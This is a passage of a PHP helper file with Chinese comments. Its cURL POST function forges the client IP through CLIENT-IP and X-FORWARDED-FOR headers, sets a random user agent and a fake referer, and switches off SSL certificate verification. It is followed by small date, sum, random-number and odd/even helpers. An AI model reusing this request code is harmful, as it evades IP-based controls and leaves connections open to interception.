    $userAgent=$agentArray[array_rand($agentArray,1)];  //随机浏览器userAgent
    $header = array(
        'CLIENT-IP:'.$ip,
        'X-FORWARDED-FOR:'.$ip,
    );    //构造ip
    $curl = curl_init(); // 启动一个CURL会话
    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    curl_setopt($curl, CURLOPT_REFERER, $referUrl);  //模拟来源网址
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); // 对认证证书来源的检查
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); // 0-跳过证书 1-从证书中检查SSL加密算法是否存在
    curl_setopt($curl, CURLOPT_USERAGENT, $userAgent); // 模拟用户使用的浏览器
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 使用自动跳转
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1); // 自动设置Referer
    curl_setopt($curl, CURLOPT_POST, 1); // 发送一个常规的Post请求
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data); // Post提交的数据包
    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
    $info = curl_exec($curl); // 执行操作
    if (curl_errno($curl)) {
        echo 'Errno'.curl_error($curl);//捕抓异常
    }
    curl_close($curl); // 关闭CURL会话
    return $info; // 返回数据，json格式
}

/**
 * 时间戳转日期 - 精确到毫秒的时间戳
 * @param $time
 * @return false|string
 */
function timeDate($time)
{
    $tag='Y-m-d H:i:s';
    $a = substr($time,0,10);
    $date = date($tag,$a);
    return $date;
}

/**
 * 数字字符串求和
 * @param $numberString
 * @return float|int
 */
function strSum ($numberString) {
    $arr = explode(',',$numberString);
    return array_sum($arr);
}

/**
 * 随机数：1-10
 * @param $num
 * @return array
 */
function randStr($num)
{
    $numbers = range (1,10);
    //shuffle 将数组顺序随即打乱
    shuffle ($numbers);
    //array_slice 取该数组中的某一段
    $result = array_slice($numbers,0,$num);
    //将数组的值按升序排列
    array_multisort($result,SORT_ASC,SORT_NUMERIC);
    return $result;
}


/**
 * 单双判断 - 1 单 2 双
 * @param $num
 * @return bool|int
 */
function isDouble($num){
    $is_double = 0;
    if(is_numeric($num)){
        if(is_int($num)){
            if($num % 2 == 0){
                $is_double = 2;
            }else{
                $is_double = 1;
            }
        }
    }else{
        return false;
    }
    return $is_double;
}